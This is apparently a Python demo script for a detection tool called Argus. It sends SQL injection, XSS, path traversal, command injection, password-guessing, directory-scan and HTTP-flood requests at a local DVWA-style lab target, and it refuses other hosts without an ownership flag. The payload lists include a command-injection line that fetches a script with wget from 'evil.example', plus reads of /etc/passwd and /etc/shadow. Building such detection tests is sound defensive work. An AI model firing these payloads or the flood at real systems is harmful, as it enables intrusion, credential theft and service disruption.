#!/usr/bin/env python3
"""Fire real HTTP attacks at YOUR OWN lab target so you can watch Argus detect them. Standard library only.

    python lab/attack_demo.py                 # everything, against http://localhost:8081
    python lab/attack_demo.py sqli xss brute  # only these
    python lab/attack_demo.py --target http://localhost:8081 flood

ONLY point this at the lab target (or another system you own). Attacking systems you do not own is illegal.
The script refuses any target that is not localhost / 127.0.0.1 unless you pass --i-own-this-target.
"""
import argparse
import concurrent.futures
import http.client
import sys
from urllib.parse import quote, urlparse

SQLI = ["1' OR '1'='1", "1' OR 1=1-- -", "' UNION SELECT user,password FROM users-- -", "1' AND SLEEP(5)-- -", "1; DROP TABLE users-- -",
        "1' AND extractvalue(1,concat(0x7e,version()))-- -", "admin'-- -", "1) AND 5870=5870 AND (4953=4953"]
XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>", "<svg onload=alert(1)>", "\"><script>alert(String.fromCharCode(88,83,83))</script>",
       "javascript:alert(1)", "<iframe src=javascript:alert(1)>"]
TRAVERSAL = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd", "/etc/shadow", "..\\..\\..\\windows\\win.ini"]
CMDI = ["127.0.0.1;cat /etc/passwd", "127.0.0.1|whoami", "$(id)", "`uname -a`", "127.0.0.1 && wget http://evil.example/x.sh"]
PASSWORDS = ["123456", "password", "letmein", "qwerty", "admin", "welcome", "monkey", "dragon", "football", "iloveyou"] * 4
VALID = {"all", "sqli", "xss", "traversal", "cmdi", "brute", "scan", "flood", "tool"}


def make_get(host, port, tls):
    def get(path, ua="Mozilla/5.0 (X11; Linux x86_64) ArgusLabDemo"):
        c = (http.client.HTTPSConnection if tls else http.client.HTTPConnection)(host, port, timeout=10)
        try:
            c.request("GET", path, headers={"User-Agent": ua})
            r = c.getresponse(); r.read()
            return r.status
        except OSError as e:
            print(f"   ! request failed: {e}"); return 0
        finally:
            c.close()
    return get


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("attacks", nargs="*", help="any of: " + " ".join(sorted(VALID)) + " (default: all)")
    ap.add_argument("--target", default="http://localhost:8081")
    ap.add_argument("--i-own-this-target", action="store_true")
    a = ap.parse_args()
    bad = [x for x in a.attacks if x not in VALID]
    if bad:
        ap.error(f"unknown attack(s): {', '.join(bad)} (choose from {', '.join(sorted(VALID))})")
    a.attacks = a.attacks or ["all"]
    u = urlparse(a.target)
    if u.hostname not in ("localhost", "127.0.0.1", "::1") and not a.i_own_this_target:
        sys.exit("Refusing: target is not localhost. Pass --i-own-this-target only for systems you own.")
    get = make_get(u.hostname, u.port or (443 if u.scheme == "https" else 80), u.scheme == "https")
    want = VALID - {"all"} if "all" in a.attacks else set(a.attacks)

    if "sqli" in want:
        print("\n== SQL injection")
        for p in SQLI: print(f"   {get('/vulnerabilities/sqli/?id=' + quote(p, safe='') + '&Submit=Submit')}  {p}")
    if "xss" in want:
        print("\n== Cross-site scripting")
        for p in XSS: print(f"   {get('/vulnerabilities/xss_r/?name=' + quote(p, safe=''))}  {p}")
    if "traversal" in want:
        print("\n== Path traversal")
        for p in TRAVERSAL: print(f"   {get('/vulnerabilities/fi/?page=' + p)}  {p}")
    if "cmdi" in want:
        print("\n== Command injection (GET form; DVWA's own form posts a body, which access logs cannot show)")
        for p in CMDI: print(f"   {get('/vulnerabilities/exec/?ip=' + quote(p, safe='') + '&Submit=Submit')}  {p}")
    if "brute" in want:
        print("\n== Brute force (password guessing)")
        for i, pw in enumerate(PASSWORDS):
            get(f"/vulnerabilities/brute/?username=admin&password={quote(pw)}{i}&Login=Login")
        print(f"   sent {len(PASSWORDS)} password guesses in a few seconds")
    if "scan" in want:
        print("\n== Reconnaissance / directory scan")
        for p in ["/.env", "/.git/config", "/phpmyadmin/", "/backup.zip", "/wp-login.php", "/server-status", "/config.php.bak"] + [f"/{w}/" for w in
                  "admin backup old test dev staging api private secret uploads files data db sql logs tmp".split()] + [f"/dir{i}/index.php" for i in range(25)]:
            get(p)
        print("   probed sensitive files and ~40 hidden directories")
    if "tool" in want:
        print("\n== Attack-tool User-Agent (sqlmap)")
        print(f"   {get('/', ua='sqlmap/1.7.11#stable (https://sqlmap.org)')}")
    if "flood" in want:
        print("\n== HTTP flood")
        with concurrent.futures.ThreadPoolExecutor(8) as ex:
            list(ex.map(lambda _: get("/"), range(400)))
        print("   sent 400 requests as fast as possible")
    print("\nDone. Open the dashboard (Alerts): detections appear within a couple of seconds.")


if __name__ == "__main__":
    main()
